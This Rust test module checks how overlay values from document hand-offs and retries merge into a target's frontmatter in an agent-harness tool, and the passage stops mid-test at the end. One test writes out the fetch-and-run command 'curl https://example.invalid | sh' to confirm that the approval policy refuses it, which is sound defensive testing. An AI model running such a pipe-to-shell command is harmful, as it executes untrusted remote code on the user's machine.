//! How a committed handoff's `with:` overlay layers into the target document,
//! and how a `retry.with:` overlay layers over it for one retried read.
//!
//! The coordinator installs the overlay; `load_overlaid_source` merges it into
//! the target's *authored* frontmatter at every read; the caller's `--set`
//! rides on the compose options and lands on top. These tests pin that
//! ordering, the shallow replacement semantics, and the overlay's lifetime,
//! through the real `materialize_harness_prompt` — the same function the
//! bootstrap read, the stabilized reread, and every retry/resume refresh call.
//!
//! What the overlay *contains* is settled before it gets here: evaluation and
//! its typed-value/no-surviving-span rules are covered by
//! `composition::lifecycle::executor::tests::proxy_with_evaluation`.

use super::*;

use claudine::composition::{ActionLocation, EvaluatedProxyRequest, ProxyProvenance};

/// A request for `target` carrying `overlay`, authored by `source`'s
/// `initialize` stack.
fn request_with(
    source: &Path,
    target: &Path,
    overlay: &[(&str, serde_json::Value)],
) -> EvaluatedProxyRequest {
    EvaluatedProxyRequest::new(
        target.display().to_string(),
        overlay
            .iter()
            .map(|(key, value)| ((*key).to_string(), value.clone()))
            .collect(),
        ProxyProvenance::new(
            source.to_path_buf(),
            ActionLocation::new(LifecycleSignal::Initialize, claudine::composition::LifecyclePath::root("initialize").index(0).field("proxy")),
            vec![source.to_path_buf()],
        ),
    )
}

struct OverlayFixture {
    fx: Fixture,
    target: PathBuf,
}

impl OverlayFixture {
    fn dir(&self) -> &Path {
        self.fx._dir.path()
    }

    /// Commit a hand-off to the fixture's target carrying `overlay`, repointing
    /// `state` at it.
    ///
    /// The guard is built and dropped inside: nothing here marks the source
    /// started or launched, so its `Drop` net synthesizes nothing.
    fn adopt(&self, state: &mut HarnessPromptState, overlay: &[(&str, serde_json::Value)]) {
        let emitter = RecordingEmitter::default();
        let ctx = LifecycleRuntimeContext {
            settings: &self.fx.settings,
            messaging: &self.fx.messaging,
            term: &self.fx.term,
            source_path: &self.fx.source_path,
            repo_root: Some(self.dir()),
            launch_area: None,
            context: None,
        };
        let mut guard = dispatch_guard(&self.fx.config, &ctx, &emitter);
        coordinator(&self.fx.source_path)
            .adopt(
                request_with(&self.fx.source_path, &self.target, overlay),
                state,
                &mut guard,
                &mut claudine::composition::ActiveDocumentState::initial(),
            )
            .expect("the hop is resolvable and uncontested");
    }

    /// Prepare the currently active document exactly as the harness loop does.
    fn materialize(
        &self,
        state: &mut HarnessPromptState,
    ) -> Result<MaterializedHarnessPrompt, color_eyre::eyre::Report> {
        super::super::super::materialize_harness_prompt(
            state,
            Some(self.dir()),
            self.dir(),
            None,
            claudine::composition::SchemaStage::Validate,
        )
    }
}

fn overlay_fixture(target_doc: &str) -> OverlayFixture {
    let fx = fixture(serde_json::json!({}));
    std::fs::write(&fx.source_path, "---\ntitle: router\n---\nrouter body\n").unwrap();
    let target = fx._dir.path().join("target.md");
    std::fs::write(&target, target_doc).unwrap();
    OverlayFixture { fx, target }
}

/// The effective frontmatter value at `key`, or `None` when the key is absent.
fn effective(materialized: &MaterializedHarnessPrompt, key: &str) -> Option<serde_json::Value> {
    materialized.frontmatter.get(key).cloned()
}

// ── precedence ────────────────────────────────────────────────────────────

/// Low → high: target-authored frontmatter < `proxy.with`.
#[test]
fn overlay_beats_the_targets_authored_frontmatter() {
    let fx = overlay_fixture("---\nphase: 1\n---\nphase={{ phase }}\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);
    let after = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        after.prompt.trim(),
        "phase=2",
        "the overlay replaces the target's authored `phase` for body interpolation"
    );
    assert_eq!(
        effective(&after, "phase"),
        Some(serde_json::json!(2)),
        "and for the effective frontmatter every later stage reads"
    );
}

/// Low → high: `proxy.with` < caller `key=value` / `--set`.
///
/// The caller stays authoritative at every document in the chain. A router that
/// could outrank an explicit `--set` would silently change what the operator
/// asked for, one hop away from where they typed it.
#[test]
fn caller_set_override_beats_a_conflicting_with_key() {
    let fx = overlay_fixture("---\nphase: 1\n---\nphase={{ phase }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    state.input_layers.set_overrides = Some(serde_json::json!({ "phase": 9 }));

    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        materialized.prompt.trim(),
        "phase=9",
        "the caller's --set outranks the router's `with:`"
    );
    assert_eq!(
        effective(&materialized, "phase"),
        Some(serde_json::json!(9)),
        "and does so in the effective frontmatter, not only in the body"
    );
    assert_eq!(
        state.overlay.values().get("phase"),
        Some(&serde_json::json!(2)),
        "losing the precedence contest does not rewrite the stored overlay"
    );
}

// ── shallow top-level semantics ───────────────────────────────────────────

#[test]
fn overlay_scalar_and_array_values_replace_the_authored_ones() {
    let fx = overlay_fixture("---\nname: authored\ntags: [x, y]\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(
        &mut state,
        &[
            ("name", serde_json::json!("overlaid")),
            ("tags", serde_json::json!(["z"])),
        ],
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "name"),
        Some(serde_json::json!("overlaid"))
    );
    assert_eq!(
        effective(&materialized, "tags"),
        Some(serde_json::json!(["z"])),
        "an array replaces wholesale rather than concatenating"
    );
}

/// An object replaces; it does not deep-merge. Deep merging would make the
/// meaning of a router's `with:` depend on what each target happened to author
/// under the same key.
#[test]
fn overlay_object_replaces_rather_than_deep_merging() {
    let fx = overlay_fixture("---\nopts:\n    a: 1\n    b: 2\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("opts", serde_json::json!({ "b": 9 }))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "opts"),
        Some(serde_json::json!({ "b": 9 })),
        "the authored `opts.a` must not survive an object overlay"
    );
}

#[test]
fn overlay_null_removes_the_targets_authored_property() {
    let fx = overlay_fixture("---\nphase: 1\nkeep: retained\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("phase", serde_json::json!(null))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "phase"),
        None,
        "a null overlay value removes the property rather than storing a null"
    );
    assert_eq!(
        effective(&materialized, "keep"),
        Some(serde_json::json!("retained")),
        "removal is per-key: untouched authored properties survive"
    );
}

/// A caller override restores a key the overlay removed — the caller is the top
/// layer for removal exactly as it is for replacement. `dropped` is the control:
/// nothing restores it, so it stays gone.
#[test]
fn a_caller_override_restores_a_key_the_overlay_removed() {
    let fx = overlay_fixture("---\nphase: 1\ndropped: authored\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);
    state.input_layers.set_overrides = Some(serde_json::json!({ "phase": 7 }));

    fx.adopt(
        &mut state,
        &[
            ("phase", serde_json::json!(null)),
            ("dropped", serde_json::json!(null)),
        ],
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "phase"),
        Some(serde_json::json!(7)),
        "the caller's --set restores the key the overlay removed"
    );
    assert_eq!(
        effective(&materialized, "dropped"),
        None,
        "a removal the caller did not restore stays removed"
    );
}

/// The evaluated types survive layering, so `with: { live: "{{ true }}" }`
/// reaches the target as JSON `true` rather than the string `"true"`.
/// Evaluation's half of this is pinned by
/// `proxy_with_evaluation::whole_value_spans_preserve_every_resolved_type`.
#[test]
fn typed_overlay_values_keep_their_types_through_layering() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(
        &mut state,
        &[
            ("live", serde_json::json!(true)),
            ("count", serde_json::json!(3)),
            ("ratio", serde_json::json!(1.5)),
            ("items", serde_json::json!([1, 2])),
            ("nested", serde_json::json!({ "k": "v" })),
        ],
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(effective(&materialized, "live"), Some(serde_json::json!(true)));
    assert_eq!(effective(&materialized, "count"), Some(serde_json::json!(3)));
    assert_eq!(effective(&materialized, "ratio"), Some(serde_json::json!(1.5)));
    assert_eq!(
        effective(&materialized, "items"),
        Some(serde_json::json!([1, 2]))
    );
    assert_eq!(
        effective(&materialized, "nested"),
        Some(serde_json::json!({ "k": "v" }))
    );
}

// ── layering reaches every stage, on every read ───────────────────────────

/// Both reads of the target see the overlay: the bootstrap read taken before
/// its `initialize` fires, and the stabilized reread taken after — with an
/// initialize-time mutation of the document visible in the second.
///
/// This is the deferred R4 sign-off from Phase 7, which built the two staged
/// reads but had no overlay to put through them.
#[test]
fn the_overlay_reaches_the_bootstrap_read_and_the_stabilized_reread() {
    let fx = overlay_fixture(
        "---\nphase: 1\nstage: authored\n---\nphase={{ phase }} stage={{ stage }}\n",
    );
    let mut state = prompt_state(&fx.fx.source_path);
    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);

    // Stage 1: the bootstrap read, the one `initialize` conditions and actions
    // evaluate against.
    let bootstrap = fx.materialize(&mut state).expect("the bootstrap read prepares");
    assert_eq!(
        bootstrap.prompt.trim(),
        "phase=2 stage=authored",
        "the overlay must be layered before target `initialize` sees the document"
    );

    // The target's `initialize` rewrites its own frontmatter, as a
    // `set_frontmatter` side effect would.
    std::fs::write(
        &fx.target,
        "---\nphase: 1\nstage: mutated-by-initialize\n---\nphase={{ phase }} stage={{ stage }}\n",
    )
    .unwrap();

    // Stage 4: the stabilized reread.
    let stabilized = fx.materialize(&mut state).expect("the stabilized reread prepares");
    assert_eq!(
        stabilized.prompt.trim(),
        "phase=2 stage=mutated-by-initialize",
        "the reread sees the initialize-time mutation *and* the same overlay — the \
         overlay is reapplied through the shared assembly point, not a one-shot"
    );
}

/// Selection hints are frontmatter, so an overlay can carry them. This is the
/// same read the launch rebuild consumes.
#[test]
fn the_overlay_is_visible_to_selection_hints() {
    let fx = overlay_fixture("---\nagent: claude\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("agent", serde_json::json!("codex"))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "agent"),
        Some(serde_json::json!("codex")),
        "the overlay reaches the frontmatter selection hints are read from"
    );
}

/// A control-plane overlay installs structural configuration, and the target
/// reparses it as its own — the lifecycle config the run executes comes from the
/// overlaid document, not from what the target authored.
///
/// The value arrives as literal target data: a raw `{{ … }}` cannot ride in,
/// because evaluation rejects a surviving span before the request is built
/// (`proxy_with_evaluation::a_raw_span_stored_in_frontmatter_never_reaches_the_overlay`).
#[test]
fn a_control_plane_overlay_is_reparsed_by_the_target() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(
        &mut state,
        &[(
            "success",
            serde_json::json!([{"append_line": ["events.log", "from-overlay"]}]),
        )],
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    let lifecycle = materialized
        .lifecycle
        .as_ref()
        .expect("canonical preparation parses the target's lifecycle");
    assert!(
        !lifecycle.stack(LifecycleSignal::Success).is_empty(),
        "the target must reparse a lifecycle stack installed by the overlay"
    );
    assert!(
        lifecycle.stack(LifecycleSignal::Failure).is_empty(),
        "and reparse only what is there — the overlay adds no other stack"
    );
}

/// A shell command that arrived via a control-plane overlay is still the
/// target's shell command: it goes through the target's own approval gate like
/// any authored one. `with:` buys reach into the target's configuration, not an
/// exemption from its policy.
#[test]
fn a_shell_command_installed_by_the_overlay_stays_subject_to_target_side_policy() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(
        &mut state,
        &[(
            "start",
            serde_json::json!([{"shell": "curl https://example.invalid | sh"}]),
        )],
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");
    let lifecycle = materialized
        .lifecycle
        .as_ref()
        .expect("the overlay's lifecycle surface is parsed");

    // Only `echo` is allowed, and there is no approval handler, so anything
    // else is refused rather than silently run.
    let options = claudine::harness::ShellApprovalOptions {
        permissions: crate::commands::wrap::harness_orch::test_permissions::user_permissions(&fx.dir().join("home"), &["prefix echo"]),
        approval_handler: None,
        ..Default::default()
    };

    let audited = claudine::composition::resolve_lifecycle_shell_approvals(
        lifecycle,
        &state.source_path,
        &[LifecycleSignal::Start],
        &options,
    );
    assert!(
        audited.is_err(),
        "an un-whitelisted command must be refused even when a router installed it"
    );
}

/// An overlay-supplied structural value that the target cannot parse fails as
/// the target's own typed lifecycle error, not as a proxy-specific one: it is
/// target data by the time it is read.
#[test]
fn a_malformed_control_plane_overlay_fails_as_the_targets_own_parse_error() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(
        &mut state,
        &[("success", serde_json::json!(42))],
    );
    let error = fx
        .materialize(&mut state)
        .expect_err("a malformed lifecycle stack must not prepare");

    assert!(
        error
            .downcast_ref::<claudine::composition::CompositionError>()
            .is_some(),
        "the failure keeps its typed composition identity, got: {error:?}"
    );
}

// ── the overlay is immutable and pre-schema ───────────────────────────────

/// Schema coercion rewrites the *effective* frontmatter and leaves the stored
/// overlay alone. If it wrote back, the next refresh would layer the coerced
/// value instead of the authored one, and repeated refreshes would drift.
#[test]
fn schema_coercion_shapes_effective_frontmatter_but_not_the_stored_overlay() {
    let fx = overlay_fixture("---\n$schema:\n    phase: 'string(required)'\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");

    assert_eq!(
        effective(&materialized, "phase"),
        Some(serde_json::json!("2")),
        "the schema coerces the overlay's number into the declared string"
    );
    assert_eq!(
        state.overlay.values().get("phase"),
        Some(&serde_json::json!(2)),
        "the stored overlay stays pre-schema — coercion never writes back"
    );
}

/// The overlay is reapplied deterministically: the same stored map produces the
/// same prepared document however many times the target is refreshed, which is
/// what makes retry, resume, and a loop iteration equivalent to the first read.
#[test]
fn refreshing_the_same_target_reapplies_the_same_overlay() {
    let fx = overlay_fixture("---\nphase: 1\n---\nphase={{ phase }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);
    let stored = state.overlay.clone();

    let first = fx.materialize(&mut state).expect("first preparation");
    assert_eq!(
        first.prompt.trim(),
        "phase=2",
        "precondition: the overlay is in force on the first read"
    );
    // A retry/resume re-entry: fresh read, same document, same overlay.
    state.entry = claudine::composition::DocumentEntryReason::Retry;
    let second = fx.materialize(&mut state).expect("refreshed preparation");

    assert_eq!(
        second.prompt.trim(),
        "phase=2",
        "the overlay outlives the attempt that installed it — a retry re-reads the \
         document but keeps the router's inputs"
    );
    assert_eq!(
        first.prompt, second.prompt,
        "the refresh reapplies the same overlay, so the prompt is unchanged"
    );
    assert_eq!(
        first.frontmatter, second.frontmatter,
        "and so is the effective frontmatter"
    );
    assert_eq!(
        state.overlay, stored,
        "preparation never mutates the stored overlay"
    );
}

// ── lifetime across hops ──────────────────────────────────────────────────

/// Forwarding is explicit. A hop whose `with:` was omitted installs an empty
/// overlay rather than inheriting the one its source was running under.
#[test]
fn a_hop_that_omits_with_installs_an_empty_overlay_rather_than_forwarding() {
    let fx = overlay_fixture("---\nphase: 1\n---\nphase={{ phase }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    state.overlay = claudine::composition::AnchoredOverlay::new(
        [("phase".to_string(), serde_json::json!(5))].into_iter().collect(),
        state.file_resolution_context(),
    );

    fx.adopt(&mut state, &[]);

    assert!(
        state.overlay.is_empty(),
        "the source's overlay is discarded with the rest of its state"
    );
    let materialized = fx.materialize(&mut state).expect("the target materializes");
    assert_eq!(
        materialized.prompt.trim(),
        "phase=1",
        "the target falls back to its own authored value, not the source's overlay"
    );
}

/// A second hop's overlay replaces the first's rather than merging with it, so
/// a middle document in a chain cannot leak a key into the third.
#[test]
fn a_second_hop_replaces_the_overlay_rather_than_merging_it() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);
    state.overlay = claudine::composition::AnchoredOverlay::new(
        [("from_first_hop".to_string(), serde_json::json!("leaked"))].into_iter().collect(),
        state.file_resolution_context(),
    );

    fx.adopt(&mut state, &[("from_second_hop", serde_json::json!("own"))]);

    assert_eq!(
        state.overlay.values().get("from_second_hop"),
        Some(&serde_json::json!("own"))
    );
    assert_eq!(
        state.overlay.values().get("from_first_hop"),
        None,
        "the previous document's overlay must not survive into the next"
    );
}

/// An overlay is not part of document identity: cycle detection and the hop
/// budget key on resolved paths, so re-entering a document with a different
/// `with:` is still a cycle.
#[test]
fn an_overlay_does_not_create_a_distinct_identity_for_cycle_detection() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let emitter = RecordingEmitter::default();
    let ctx = LifecycleRuntimeContext {
        settings: &fx.fx.settings,
        messaging: &fx.fx.messaging,
        term: &fx.fx.term,
        source_path: &fx.fx.source_path,
        repo_root: Some(fx.dir()),
        launch_area: None,
        context: None,
    };
    let mut guard = dispatch_guard(&fx.fx.config, &ctx, &emitter);
    let mut state = prompt_state(&fx.fx.source_path);
    let mut coord = coordinator(&fx.fx.source_path);

    coord
        .adopt(
            request_with(
                &fx.fx.source_path,
                &fx.target,
                &[("phase", serde_json::json!(1))],
            ),
            &mut state,
            &mut guard,
            &mut claudine::composition::ActiveDocumentState::initial(),
        )
        .expect("the first hop is uncontested");
    let _ = coord.take_bootstrap_pending();

    // Same target, different overlay. If the overlay were part of identity this
    // would be a fresh document and the chain would never close.
    let error = coord
        .adopt(
            request_with(&fx.target, &fx.target, &[("phase", serde_json::json!(2))]),
            &mut state,
            &mut guard,
            &mut claudine::composition::ActiveDocumentState::initial(),
        )
        .expect_err("a hop back to a document already in the chain is a cycle");

    let claudine::composition::ProxyCommitError::Rejected(composition) = error else {
        panic!("a cycle is a ledger rejection, not a resolution failure");
    };
    assert!(
        matches!(
            composition,
            claudine::composition::CompositionError::LifecycleProxyCycle { .. }
        ),
        "a different overlay does not buy a second visit to the same document"
    );
    assert_eq!(
        state.overlay.values().get("phase"),
        Some(&serde_json::json!(1)),
        "a refused hop leaves the active document's overlay untouched"
    );
}

// ── the overlay is transient ──────────────────────────────────────────────

/// `with:` is transient state, unlike `set_frontmatter`/`merge_frontmatter`.
/// Neither the router nor the target is rewritten, so a document's bytes — and
/// therefore its Darkmatter hash, which is a function of them — are unchanged
/// by having been proxied to with an overlay.
#[test]
fn an_overlay_never_writes_to_disk() {
    let fx = overlay_fixture("---\nphase: 1\nhash: seeded\n---\nphase={{ phase }}\n");
    let source_before = std::fs::read(&fx.fx.source_path).unwrap();
    let target_before = std::fs::read(&fx.target).unwrap();

    let mut state = prompt_state(&fx.fx.source_path);
    fx.adopt(&mut state, &[("phase", serde_json::json!(2))]);
    let materialized = fx.materialize(&mut state).expect("the target materializes");
    assert_eq!(
        materialized.prompt.trim(),
        "phase=2",
        "precondition: the overlay did take effect for this run"
    );

    assert_eq!(
        std::fs::read(&fx.fx.source_path).unwrap(),
        source_before,
        "the router's bytes are unchanged by the hand-off"
    );
    assert_eq!(
        std::fs::read(&fx.target).unwrap(),
        target_before,
        "the target's bytes are unchanged: `with:` is transient, and a persisted \
         overlay would silently rewrite a document the operator never edited"
    );
}

// ── schema interaction ────────────────────────────────────────────────────

/// A router can satisfy a target's required schema property that the target
/// does not author — the overlay lands in the target's frontmatter ahead of
/// validation (and reaches compose as a data layer).
#[test]
fn with_satisfies_a_required_schema_property_the_target_does_not_author() {
    let fx = overlay_fixture("---\n$schema:\n    topic: 'string(required)'\n---\nplan {{ topic }}\n");
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("topic", serde_json::json!("proxies"))]);
    let materialized = fx
        .materialize(&mut state)
        .expect("the overlay satisfies the target's required property");

    assert_eq!(materialized.prompt.trim(), "plan proxies");
}

/// A file-valued overlay property resolves from the document that authored
/// the `with:` — the router — not from the target's directory and not from the
/// caller's launch-area anchor, which only the caller's own setters use. A
/// bare relative reference follows the same rule as `./`.
#[test]
fn a_file_valued_overlay_property_resolves_from_the_router_that_authored_it() {
    let fx = fixture(serde_json::json!({}));
    std::fs::write(&fx.source_path, "---\ntitle: router\n---\nrouter body\n").unwrap();
    let target = fx._dir.path().join("target-dir/target.md");
    std::fs::create_dir_all(target.parent().unwrap()).unwrap();
    std::fs::write(&target, "---\n$schema:\n    spec: 'file(required;eager)'\n---\nspec says: {{ spec }}\n").unwrap();
    let fx = OverlayFixture { fx, target };
    let router_dir = fx.fx.source_path.parent().unwrap().to_path_buf();
    let launch_area = fx.dir().join("area");
    std::fs::create_dir_all(&launch_area).unwrap();
    // `required;eager` resolves and existence-checks the reference; a decoy
    // in each wrong directory makes the winner the only possible reading.
    for dir in [&router_dir, &launch_area, &fx.target.parent().unwrap().to_path_buf()] {
        std::fs::write(dir.join("spec.md"), "---\ntitle: s\n---\nspec\n").unwrap();
    }

    let mut state = prompt_state(&fx.fx.source_path);
    // The caller's launch-area anchor, exactly as a direct invocation carries it.
    state.input_layers.file_ref_fallback_dir = Some(launch_area.clone());

    fx.adopt(&mut state, &[("spec", serde_json::json!("spec.md"))]);
    let materialized = fx
        .materialize(&mut state)
        .expect("the overlay's file reference resolves from the router");

    assert_eq!(
        effective(&materialized, "spec"),
        Some(serde_json::json!(router_dir.join("spec.md").display().to_string())),
        "the overlay's relative reference resolves from the file that authored it"
    );
    let presentation_path = router_dir
        .join("spec.md")
        .display()
        .to_string()
        .replace('\\', "/");
    assert!(
        materialized.prompt.contains(&presentation_path),
        "the body sees a portable presentation of the resolved value; got: {}",
        materialized.prompt
    );
}

/// An overlay value the target's schema rejects fails at preparation — a typed
/// composition error, raised before any provider launch. Preparation is what
/// builds the prompt, so there is nothing to launch with.
///
/// The target authors a *valid* `topic`, so the failure is attributable to the
/// overlay rather than to the property having been missing all along.
///
/// **Rewritten by Phase 12, intentionally.** This asserted
/// `ComposeFailed(SchemaValidationFailed)` — the *uncategorized* compose
/// failure. That was the route drift Phase 8's own scope note recorded and
/// handed to Phase 12: the harness route composed through
/// `prepare_direct_with_prompt` while `compose` and `sequence` composed through
/// `prepare_direct_with_schema`, so this document surfaced a different typed
/// identity depending on how it was reached. `prepare_document` now routes
/// through the schema layer, so the categorized `SchemaValidation` arrives here
/// exactly as it always did on the direct route. The pre-launch timing this
/// test's name pins is unchanged.
#[test]
fn an_invalid_overlay_fails_the_targets_schema_before_any_launch() {
    let fx = overlay_fixture(
        "---\n$schema:\n    topic: 'string(required)'\ntopic: authored\n---\nplan {{ topic }}\n",
    );
    let mut state = prompt_state(&fx.fx.source_path);

    fx.adopt(&mut state, &[("topic", serde_json::json!(["not", "a", "string"]))]);
    let error = fx
        .materialize(&mut state)
        .expect_err("an array cannot satisfy the `string(required)` the target validates");

    let composition = error
        .downcast_ref::<claudine::composition::CompositionError>()
        .unwrap_or_else(|| panic!("expected a typed composition error, got: {error:?}"));
    assert!(
        matches!(
            composition,
            claudine::composition::CompositionError::SchemaValidation { problems, .. }
                if problems.iter().any(|problem| problem == "/topic")
        ),
        "the target's own schema failure surfaces, categorized and naming the \
         offending property — not a proxy-specific error and not the \
         uncategorized compose failure the harness route used to return: \
         {composition:?}"
    );
}

#[test]
fn overlay_cannot_install_an_initialization_shell() {
    let fx = overlay_fixture("---\ntitle: t\n---\nbody\n");
    let mut state = prompt_state(&fx.fx.source_path);
    fx.adopt(&mut state, &[("initialize", serde_json::json!([{"shell": "echo forbidden"}]))]);
    let error = fx.materialize(&mut state).unwrap_err();
    assert!(matches!(error.downcast_ref::<CompositionError>(),
        Some(CompositionError::LifecycleActionPlacement { action, event, .. })
        if action == "shell" && event == "initialize"), "{error:?}");
}

// ── `retry.with` overlays ─────────────────────────────────────────────────
//
// A retry overlay rides on the `retry` control, is staged by the dispatch for
// the retried attempt's fresh read, and is consumed by that read. It layers
// over a retained proxy overlay key-wise. Evaluation is covered by
// `composition::lifecycle::executor::tests::retry_with_evaluation`.

impl OverlayFixture {
    /// Dispatch `control` as the active document's `failure` control, after a
    /// launched attempt with live session `sess-1`.
    fn dispatch(
        &self,
        state: &mut HarnessPromptState,
        active: &mut claudine::composition::ActiveDocumentState,
        control: StackControl,
    ) -> TerminalControlAction {
        let emitter = RecordingEmitter::default();
        let ctx = LifecycleRuntimeContext {
            settings: &self.fx.settings,
            messaging: &self.fx.messaging,
            term: &self.fx.term,
            source_path: &self.fx.source_path,
            repo_root: Some(self.dir()),
            launch_area: None,
            context: None,
        };
        let mut guard = dispatch_guard(&self.fx.config, &ctx, &emitter);
        guard.mark_provider_launched();
        assert!(guard.record_event_emission(LifecycleSignal::Failure));
        let attempt = active.iteration().attempt().number();
        dispatch_terminal_control(
            &outcome_with(control),
            attempt,
            active.iteration_mut(),
            Some("sess-1"),
            resume_capable_profile(),
            Provider::Claude,
            state,
            &self.fx.materialized,
            &mut guard,
            &ledger(&self.fx.source_path),
            &self.fx.term,
            false,
        )
    }
}

fn retry_with(overlay: &[(&str, serde_json::Value)]) -> StackControl {
    StackControl::Retry {
        max_attempts: 5,
        backoff: RetryBackoff::Fixed,
        delay: "0s".to_string(),
        overlay: overlay
            .iter()
            .map(|(key, value)| ((*key).to_string(), value.clone()))
            .collect(),
    }
}

/// A fixture whose *source* is the active document the retries re-read.
fn retry_fixture(source_doc: &str) -> OverlayFixture {
    let fx = overlay_fixture("---\ntitle: unused\n---\nunused\n");
    std::fs::write(&fx.fx.source_path, source_doc).unwrap();
    fx
}

/// Repeated retry: the first retry's overlay reaches its own fresh read only;
/// a second retry without `with:` reads the authored document, and so does a
/// later refresh with no retry at all.
#[test]
fn a_retry_overlay_applies_to_its_own_fresh_read_only() {
    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    let action = fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
    assert!(matches!(action, TerminalControlAction::Continue), "{action:?}");
    let first = fx.materialize(&mut state).expect("the retried read materializes");
    assert_eq!(first.prompt.trim(), "reason=flaky");
    assert_eq!(effective(&first, "reason"), Some(serde_json::json!("flaky")));
    assert_eq!(state.pending_retry_overlay, None, "the fresh read consumed the overlay");

    let refreshed = fx.materialize(&mut state).expect("a later refresh materializes");
    assert_eq!(refreshed.prompt.trim(), "reason=authored", "a later read never sees it");

    fx.dispatch(&mut state, &mut active, retry_with(&[]));
    let second = fx.materialize(&mut state).expect("the second retry materializes");
    assert_eq!(
        second.prompt.trim(),
        "reason=authored",
        "a retry without `with:` supplies no retry overlay"
    );
}

/// A second retry fired before the first one's overlay was read replaces it
/// rather than merging.
#[test]
fn a_later_retry_replaces_an_unconsumed_retry_overlay() {
    let fx = retry_fixture("---\na: authored-a\nb: authored-b\n---\na={{ a }} b={{ b }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    fx.dispatch(&mut state, &mut active, retry_with(&[("a", serde_json::json!("first"))]));
    fx.dispatch(&mut state, &mut active, retry_with(&[("b", serde_json::json!("second"))]));
    let read = fx.materialize(&mut state).expect("the retried read materializes");
    assert_eq!(read.prompt.trim(), "a=authored-a b=second");
}

/// Retry then resume: `resume` takes no `with:` and clears an unconsumed retry
/// overlay, so the resumed read sees the authored document.
#[test]
fn a_resume_never_sees_a_retry_overlay() {
    let fx = retry_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();

    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
    let action = fx.dispatch(
        &mut state,
        &mut active,
        StackControl::Resume {
            message: "keep going".to_string(),
            max_attempts: 3,
        },
    );
    assert!(matches!(action, TerminalControlAction::Continue), "{action:?}");
    assert_eq!(state.pending_retry_overlay, None);
    assert_eq!(state.entry, claudine::composition::DocumentEntryReason::Resume);
    let resumed = fx.materialize(&mut state).expect("the resumed read materializes");
    assert_eq!(effective(&resumed, "reason"), Some(serde_json::json!("authored")));
}

/// On a proxy-owned active document the retained proxy overlay stays beneath
/// the retry overlay: the retry wins a shared key, the proxy's other keys
/// survive, and the next read is back to the proxy overlay alone.
#[test]
fn a_retry_overlay_layers_over_the_retained_proxy_overlay() {
    let fx = overlay_fixture(
        "---\nphase: 1\nreason: authored\n---\nphase={{ phase }} reason={{ reason }}\n",
    );
    let mut state = prompt_state(&fx.fx.source_path);
    let mut active = claudine::composition::ActiveDocumentState::initial();
    fx.adopt(
        &mut state,
        &[("phase", serde_json::json!(2)), ("reason", serde_json::json!("routed"))],
    );
    let proxy_overlay = state.overlay.clone();

    fx.dispatch(&mut state, &mut active, retry_with(&[("reason", serde_json::json!("flaky"))]));
    let retried = fx.materialize(&mut state).expect("the retried target materializes");
    assert_eq!(retried.prompt.trim(), "phase=2 reason=flaky");
    assert_eq!(state.overlay, proxy_overlay, "the retained proxy overlay is not rewritten");

    let refreshed = fx.materialize(&mut state).expect("a later read materializes");
    assert_eq!(refreshed.prompt.trim(), "phase=2 reason=routed");
}

/// Adopting a proxy target drops an unconsumed retry overlay: it belonged to
/// the source's retried attempt.
#[test]
fn proxy_adoption_drops_an_unconsumed_retry_overlay() {
    let fx = overlay_fixture("---\nreason: authored\n---\nreason={{ reason }}\n");
    let mut state = prompt_state(&fx.fx.source_path);
    state.pending_retry_overlay =
        Some(std::iter::once(("reason".to_string(), serde_json::json!("flaky"))).collect());

    fx.adopt(&mut state, &[]);
    assert_eq!(state.pending_retry_overlay, None);
